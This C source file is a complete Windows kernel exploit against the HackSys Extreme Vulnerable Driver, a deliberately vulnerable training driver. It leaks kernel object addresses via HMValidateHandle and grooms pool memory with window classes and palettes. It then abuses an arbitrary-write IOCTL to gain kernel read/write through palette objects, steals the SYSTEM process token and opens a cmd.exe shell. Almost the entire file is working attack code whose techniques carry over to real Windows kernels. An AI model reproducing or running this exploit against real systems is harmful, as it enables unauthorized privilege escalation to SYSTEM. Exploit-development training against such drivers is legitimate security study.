#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <winternl.h>
#include <strsafe.h>
#include <assert.h>
#include <conio.h>

#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ARBITRARY_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN, 0X802, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef void*(NTAPI *lHMValidateHandle)(HWND h, int type);//HMValidateHandle leak HWND

extern "C" int _stdcall Int_3();
lHMValidateHandle pHmValidateHandle = NULL;

typedef struct _HEAD
{
	HANDLE h;
	DWORD  cLockObj;
} HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
} THROBJHEAD, *PTHROBJHEAD;
//
typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID    rpdesk;
	PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, *PTHRDESKHEAD;

typedef struct _G_PALETTE
{
	HPALETTE _hpalette;
	DWORD64 _kobj_palette;
	DWORD flag;
} GPALETTE, *PGPALETTE;

typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;
#define MAX_LOG_MESSAGE 1024

typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);


BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}

BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		LogMessage(L_ERROR,L"Failed to load user32");
		return FALSE;
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		LogMessage(L_ERROR,L"Failed to find location of exported function 'IsMenu' within user32.dll");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		LogMessage(L_ERROR,L"Failed to find offset of HMValidateHandle from location of 'IsMenu'");
		return FALSE;
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

LRESULT CALLBACK MainWProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

HPALETTE createPaletteofSize(int size) {
	// we alloc a palette which will have the specific size on the paged session pool. 
	if (size <= 0x90) {
		LogMessage(L_ERROR,L"Bad size! can't allocate palette of size < 0x90!");
		return 0;
	}
	int pal_cnt = (size - 0x90) / 4;
	int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY);
	LOGPALETTE *lPalette = (LOGPALETTE*)malloc(palsize);
	memset(lPalette, 0x4, palsize);
	lPalette->palNumEntries = pal_cnt;
	lPalette->palVersion = 0x300;
	return CreatePalette(lPalette);
}

int writeOOB(HPALETTE worker_palette,HPALETTE manager_palette, UINT64 target_address, BYTE* data, int size) {
	if (!manager_palette || !worker_palette) {
		LogMessage(L_ERROR,L"Palettes not initialized yet!");
		return 0;
	}

	// overflow into worker_palette to set values
	SetPaletteEntries(manager_palette, 0, sizeof(PVOID) / sizeof(PALETTEENTRY), (PALETTEENTRY*)&target_address);

	// trigger SetPaletteEntries on worker_palette to write the actual data
	// return actual amount of bytes written (*4), not amount of palette entries written
	return SetPaletteEntries(worker_palette, 0, size / sizeof(PALETTEENTRY), (PALETTEENTRY*)data);
}

int readOOB(HPALETTE worker_palette,HPALETTE manager_palette,UINT64 target_address, BYTE* data, int size) {
	if (!manager_palette || !worker_palette) {
		LogMessage(L_ERROR,L"Palettes not initialized yet!");
		return 0;
	}
	// overflow into worker_palette to set values
	SetPaletteEntries(manager_palette, 0, sizeof(PVOID) / sizeof(PALETTEENTRY), (PALETTEENTRY*)&target_address);

	// trigger GetPaletteEntries on worker_palette to read the actual data
	// return actual amount of bytes read (*4), not amount of palette entries read
	return GetPaletteEntries(worker_palette, 0, size / sizeof(PALETTEENTRY), (PALETTEENTRY*)data);
}

void PopShell()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

}

PGPALETTE CreatePaletteInHole()
{
	PGPALETTE pgpalette = (PGPALETTE)malloc(sizeof(PGPALETTE));
	TCHAR st[0x68];
	WNDCLASSEX Class2 = { 0 };
	//wsprintf(st, L"CCCCCCCCCCCCCCCCCCCCCCC");
	memset(st,0x41,sizeof(st));
	Class2.lpfnWndProc = DefWindowProc;
	Class2.lpszClassName = TEXT("k0shl");
	Class2.lpszMenuName = st;
	Class2.cbSize = sizeof(WNDCLASSEX);
	//Int_3();
	//int result = RegisterClassEx(&wnd);
	DWORD dwcount = 0;
	while(dwcount < 20)
	{
		int result = RegisterClassEx(&Class2);
		if (!result)
		{
			LogMessage(L_ERROR,L"RegisterClassEx error: %d", GetLastError());
			exit(-1);
		}
		//Int_3();
		HWND test = CreateWindowEx(
			0,
			Class2.lpszClassName,//wnd.lpszClassName,
			TEXT("WORDS"),
			0,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			NULL, NULL, NULL, NULL);
		//Int_3();
		PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(test, 1);
		//Int_3();
		DWORD64 KerneltagWND = (DWORD64)(tagWND->pSelf);
		DWORD64 UsertagWND = (DWORD64)tagWND;
		//Int_3();
		DWORD64 ulClientDelta = KerneltagWND - UsertagWND;
		DWORD64 KerneltagCLS = *(PDWORD64)(UsertagWND+0xa8);
		DWORD64 lpszMenuNameA = *(PDWORD64)(KerneltagCLS-ulClientDelta+0x98);
		//#ifdef _WIN64
		//		printf("Kernel memory address: 0x%llx, 0x%llx,0x%llx,0x%llx,0x%llxtagTHREAD memory address: 0x%llx\n", tagWND->pSelf,tagWND,(PVOID)ulClientDelta,(PVOID)KerneltagCLS,(PVOID)lpszMenuName, tagWND->h.pti);
		//#else
		//		printf("Kernel memory address: 0x%X, tagTHREAD memory address: 0x%X\n", tagWND->pSelf, tagWND->h.pti);
		//#endif
		//Int_3();
		DestroyWindow(test);
		//createPaletteofSize(0x190);
		UnregisterClass(Class2.lpszClassName,NULL);
		result = RegisterClassEx(&Class2);
		if (!result)
		{
			LogMessage(L_ERROR,L"RegisterClassEx error: %d", GetLastError());
			exit(-1);
		}
		//Int_3();
		test = CreateWindowEx(
			0,
			Class2.lpszClassName,//wnd.lpszClassName,
			TEXT("WORDS"),
			0,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			NULL, NULL, NULL, NULL);
		//Int_3();
		tagWND = (PTHRDESKHEAD)pHmValidateHandle(test, 1);
		//Int_3();
		KerneltagWND = (DWORD64)(tagWND->pSelf);
		UsertagWND = (DWORD64)tagWND;
		//Int_3();
		ulClientDelta = KerneltagWND - UsertagWND;
		KerneltagCLS = *(PDWORD64)(UsertagWND+0xa8);
		DWORD64 lpszMenuNameB = *(PDWORD64)(KerneltagCLS-ulClientDelta+0x98);
		if(lpszMenuNameB == lpszMenuNameA)
		{
			DestroyWindow(test);
			//createPaletteofSize(0x190);
			UnregisterClass(Class2.lpszClassName,NULL);
			//Int_3();
			pgpalette->_hpalette = (HPALETTE)createPaletteofSize(0xe0);
			pgpalette->_kobj_palette = lpszMenuNameA;
			pgpalette->flag = 1;
			return pgpalette;
		}
		DestroyWindow(test);
		//createPaletteofSize(0x190);
		UnregisterClass(Class2.lpszClassName,NULL);
		dwcount++;
	}
	return 0;
}

int main()
{
	LPCWSTR lpDeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
	HANDLE hDevice;
	BOOL bResult = FALSE;
	DWORD junk = 0;
	PWRITE_WHAT_WHERE WriteWhatWhere = NULL;
	ULONG BytesReturned;
	int cRead = 0;
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	FARPROC tmp = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)tmp;
	
	//Load HEVD Driver and init exploit attack function
	LogMessage(L_INFO,L"*****Start Exploit*****");
	hDevice = CreateFile(lpDeviceName,					// Name of the write
		GENERIC_READ | GENERIC_WRITE,					// Open for reading/writing
		FILE_SHARE_WRITE,								// Allow Share
		NULL,											// Default security
		OPEN_EXISTING,									// Opens a file or device, only if it exists.
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
		NULL); // No attr. template
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		LogMessage(L_ERROR,L"Unable to get Driver handle");
		exit(1);
	}
	LogMessage(L_INFO,L"Create HEVD Device Success,Handle at: 0x%p",hDevice);
	BOOL bFound = FindHMValidateHandle();
	if (!bFound) {
		LogMessage(L_ERROR,L"Failed to locate HmValidateHandle, exiting");
		return 1;
	}
	LogMessage(L_INFO,L"Found location of HMValidateHandle in user32.dll");

	//Make stable pool hole and leak palette kernel object info
	PGPALETTE Worker_Palette;
	PGPALETTE Manager_Palette;
	LogMessage(L_INFO,L"Now make worker and manager palette...");
	Manager_Palette = CreatePaletteInHole();
	if(!Manager_Palette)
	{
		LogMessage(L_ERROR,L"Make Manager Palette failure...");
		return 0;
	}
	//Int_3();
	LogMessage(L_INFO,L"Manager Palette HPALETTE: 0x%p, Kernel Address: 0x%llx",(PVOID)Manager_Palette->_hpalette,Manager_Palette->_kobj_palette);
	Worker_Palette = CreatePaletteInHole();
	if(!Worker_Palette)
	{
		LogMessage(L_ERROR,L"Make Worker Palette failure...");
		return 0;
	}
	//Int_3();
	LogMessage(L_INFO,L"Worker Palette HPALETTE: 0x%p, Kernel Address: 0x%llx",(PVOID)Worker_Palette->_hpalette,Worker_Palette->_kobj_palette);
	
	//Init struct write-what-where
	LogMessage(L_INFO,L"Trigger HEVD Vul Arbitrary Write...");
	WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(WRITE_WHAT_WHERE));
	if (!WriteWhatWhere) {
		LogMessage(L_ERROR,L"Failed To Allocate Memory: 0x%X", GetLastError());
		exit(-1);
	}
	LogMessage(L_INFO,L"Memory Allocated: 0x%p", WriteWhatWhere);
	
	DWORD64 pFirstColorOffset = 0x78;
	DWORD64 Manager_pFirstColor = Manager_Palette->_kobj_palette+pFirstColorOffset;
	DWORD64 Worker_pFirstColor = Worker_Palette->_kobj_palette+pFirstColorOffset;
	LogMessage(L_INFO,L"Overwrite Manager Palette pFirstColor: 0x%p, value is Worker Palette pFirstColor: 0x%p",Manager_pFirstColor,Worker_pFirstColor);
	WriteWhatWhere->Where = (PULONG_PTR)Manager_pFirstColor;
	WriteWhatWhere->What = (PULONG_PTR)&Worker_pFirstColor;
	//Int_3();
	DeviceIoControl(hDevice,
		HACKSYS_EVD_IOCTL_ARBITRARY_OBJECT,
		(LPVOID)WriteWhatWhere,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&BytesReturned,
		NULL);

	//Leak _EPROCESS through tagWND->h.pti => _KTHREAD => _KAPC_STATE => _EPROCESS
	LogMessage(L_INFO,L"Leak _EPROCESS by tagWND NOW...");
	WNDCLASSEX leak_Class = { 0 };
	//wsprintf(st, L"CCCCCCCCCCCCCCCCCCCCCCC");
	leak_Class.lpfnWndProc = DefWindowProc;
	leak_Class.lpszClassName = TEXT("k0shl");
	leak_Class.lpszMenuName = TEXT("k0shl");
	leak_Class.cbSize = sizeof(WNDCLASSEX);
	int result = RegisterClassEx(&leak_Class);
	if (!result)
	{
		LogMessage(L_ERROR,L"RegisterClassEx error: %d", GetLastError());
		exit(-1);
	}
	HWND leak_HWND = CreateWindowEx(
		0,
		leak_Class.lpszClassName,//wnd.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL, NULL, NULL, NULL);
	//Int_3();
	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(leak_HWND, 1);
	DWORD64 _KTHREAD_kobj;
	
	readOOB(Worker_Palette->_hpalette,Manager_Palette->_hpalette,(DWORD64)tagWND->h.pti,(BYTE *)&_KTHREAD_kobj,sizeof(DWORD64));
	//Int_3();
	LogMessage(L_INFO,L"_KTHREAD address is: 0x%p",(DWORD64)_KTHREAD_kobj);
	DWORD64 _KAPC_uobj = (DWORD64)_KTHREAD_kobj+0x98;
	DWORD64 _KAPC_kobj = 0;
	readOOB(Worker_Palette->_hpalette,Manager_Palette->_hpalette,(UINT64)_KAPC_uobj,(BYTE *)&_KAPC_kobj,sizeof(DWORD64));
	//Int_3();
	LogMessage(L_INFO,L"_KAPC_STAT address is: 0x%p",(DWORD64)_KAPC_kobj);
	DWORD64 _EPROCESS_uobj = _KAPC_kobj+0x20;
	DWORD64 _EPROCESS_kobj = 0;
	readOOB(Worker_Palette->_hpalette,Manager_Palette->_hpalette,(UINT64)_EPROCESS_uobj,(BYTE *)&_EPROCESS_kobj,sizeof(DWORD64));
	//Int_3();
	LogMessage(L_INFO,L"Current _EPROCESS address is: 0x%p",(DWORD64)_EPROCESS_kobj);
	DWORD64 _Current_Token = 0;
	DWORD64 _Current_Token_Address = _EPROCESS_kobj+0x358;
	readOOB(Worker_Palette->_hpalette,Manager_Palette->_hpalette,(UINT64)_Current_Token_Address,(BYTE *)&_Current_Token,sizeof(DWORD64));
	//Int_3();
	LogMessage(L_INFO,L"Current Process Token is: 0x%p",_Current_Token);
	LogMessage(L_INFO,L"Current Process Token at: 0x%p",_Current_Token_Address);

	//Let's find system process and system token
	DWORD dwUniqueProcessIdOffset = 0x2e0;
	DWORD dwTokenOffset = 0x358;
	DWORD dwActiveProcessLinks = 0x2e8;
	DWORD64 lpPreEPROCESS = NULL;
	DWORD64 lpCurrentProcID = NULL;
	LIST_ENTRY lePreProcessLink;
	DWORD64 lpSystemToken = NULL;
	DWORD dwCurrentPID;
	readOOB(Worker_Palette->_hpalette,Manager_Palette->_hpalette,_EPROCESS_kobj + dwUniqueProcessIdOffset,(BYTE *)&lpCurrentProcID,sizeof(DWORD64));
	readOOB(Worker_Palette->_hpalette,Manager_Palette->_hpalette,_EPROCESS_kobj + dwActiveProcessLinks,(BYTE *)&lePreProcessLink,sizeof(LIST_ENTRY));
	do {
		lpPreEPROCESS = (DWORD64)lePreProcessLink.Blink - dwActiveProcessLinks;
		readOOB(Worker_Palette->_hpalette,Manager_Palette->_hpalette, lpPreEPROCESS + dwUniqueProcessIdOffset, (BYTE *)&lpCurrentProcID, sizeof(DWORD64));
		readOOB(Worker_Palette->_hpalette,Manager_Palette->_hpalette, lpPreEPROCESS + dwTokenOffset, (BYTE *)&lpSystemToken, sizeof(DWORD64));

		// Read _LIST_ENTRY to next Active _EPROCESS Structure
		readOOB(Worker_Palette->_hpalette,Manager_Palette->_hpalette, lpPreEPROCESS + dwActiveProcessLinks, (BYTE *)&lePreProcessLink, sizeof(LIST_ENTRY));

		dwCurrentPID = LOWORD(lpCurrentProcID);

	} while (dwCurrentPID != 0x4);
	//Int_3();
	LogMessage(L_INFO,L"System Process Token is: 0x%p",lpSystemToken);
	LogMessage(L_INFO,L"Now Stealing Token...");
	//Int_3();
	writeOOB(Worker_Palette->_hpalette,Manager_Palette->_hpalette,_Current_Token_Address,(BYTE *)&lpSystemToken,sizeof(DWORD64));

	//Have fun and check SYSTEM!
	LogMessage(L_INFO,L"PWN and have fun!Check SYSTEM...");
	PopShell();
	return 0;
}